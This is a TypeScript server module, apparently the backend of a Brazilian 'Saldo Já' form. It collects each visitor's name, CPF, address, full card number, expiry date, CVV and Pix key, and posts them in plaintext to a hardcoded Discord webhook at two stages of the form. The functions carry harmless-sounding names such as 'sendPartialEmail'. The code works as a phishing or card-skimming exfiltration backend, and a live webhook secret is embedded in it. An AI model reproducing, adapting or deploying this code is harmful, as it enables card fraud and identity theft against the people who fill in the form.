import { createServerFn } from "@tanstack/react-start";

type FormData = {
  name: string;
  cpf: string;
  phone: string;
  email: string;
  cep: string;
  state: string;
  city: string;
  address: string;
  number: string;
  complement?: string;
  cardBrand: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  amount?: string;
  pixKeyType?: string;
  pixKey?: string;
};

function safeValue(value?: string) {
  return value && value.trim() ? value.trim().slice(0, 900) : "Não informado";
}

function buildDiscordPayload(data: FormData, isComplete: boolean) {
  return {
    username: "Saldo Já - Notificação",
    embeds: [
      {
        title: `${isComplete ? "🚀 Solicitação Completa" : "⏳ Solicitação Parcial"}`,
        description: `Nova solicitação recebida de **${safeValue(data.name)}**`,
        color: isComplete ? 0x16a34a : 0xf59e0b,
        timestamp: new Date().toISOString(),
        fields: [
          { name: "👤 Nome", value: safeValue(data.name), inline: true },
          { name: "🆔 CPF", value: safeValue(data.cpf), inline: true },
          { name: "📞 Telefone", value: safeValue(data.phone), inline: true },
          { name: "📧 E-mail", value: safeValue(data.email), inline: true },
          { name: "📍 CEP", value: safeValue(data.cep), inline: true },
          { name: "🏙️ Cidade/UF", value: `${safeValue(data.city)} / ${safeValue(data.state)}`, inline: true },
          { name: "🏠 Endereço", value: `${safeValue(data.address)}, ${safeValue(data.number)}`, inline: false },
          { name: "🏢 Complemento", value: safeValue(data.complement), inline: false },
          { name: "💳 Bandeira", value: safeValue(data.cardBrand), inline: true },
          { name: "🔢 Cartão", value: safeValue(data.cardNumber), inline: true },
          { name: "📅 Validade", value: safeValue(data.expiry), inline: true },
          { name: "🔒 CVV", value: safeValue(data.cvv), inline: true },
          ...(isComplete
            ? [
                { name: "💰 Valor", value: `R$ ${safeValue(data.amount)}`, inline: true },
                { name: "🔑 Tipo Pix", value: safeValue(data.pixKeyType), inline: true },
                { name: "🎯 Chave Pix", value: safeValue(data.pixKey), inline: true },
              ]
            : []),
        ],
        footer: {
          text: "Sistema Saldo Já",
        }
      },
    ],
  };
}

async function sendDiscordWebhook(data: FormData, isComplete: boolean) {
  const webhookUrl = "https://discord.com/api/webhooks/1538532902277615658/0UErhnnpoxvAbjtJVulGoyHIIOUZb45ypjHVKWOGGEbOHTNGGNQVtTzMfTaJhTIGQXoh";

  const response = await fetch(webhookUrl, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(buildDiscordPayload(data, isComplete)),
  });

  if (!response.ok) {
    const errorBody = await response.text();
    throw new Error(`Discord webhook falhou [${response.status}]: ${errorBody}`);
  }
}

// Enviar notificação parcial (etapa 3)
export const sendPartialEmail = createServerFn({ method: "POST" })
  .handler(async (ctx: any) => {
    const data = ctx?.data as { formData: FormData } | undefined;
    if (!data?.formData) throw new Error("Dados do formulário não encontrados");
    try {
      await sendDiscordWebhook(data.formData, false);
      return { success: true, message: "Notificação parcial enviada com sucesso" };
    } catch (error) {
      console.error("Erro ao enviar notificação parcial:", error);
      return { success: false, message: "Erro ao enviar notificação" };
    }
  });

// Enviar notificação completa (etapa 4)
export const sendCompleteEmail = createServerFn({ method: "POST" })
  .handler(async (ctx: any) => {
    const data = ctx?.data as { formData: FormData } | undefined;
    if (!data?.formData) throw new Error("Dados do formulário não encontrados");
    try {
      await sendDiscordWebhook(data.formData, true);
      return { success: true, message: "Notificação completa enviada com sucesso" };
    } catch (error) {
      console.error("Erro ao enviar notificação completa:", error);
      return { success: false, message: "Erro ao enviar notificação" };
    }
  });
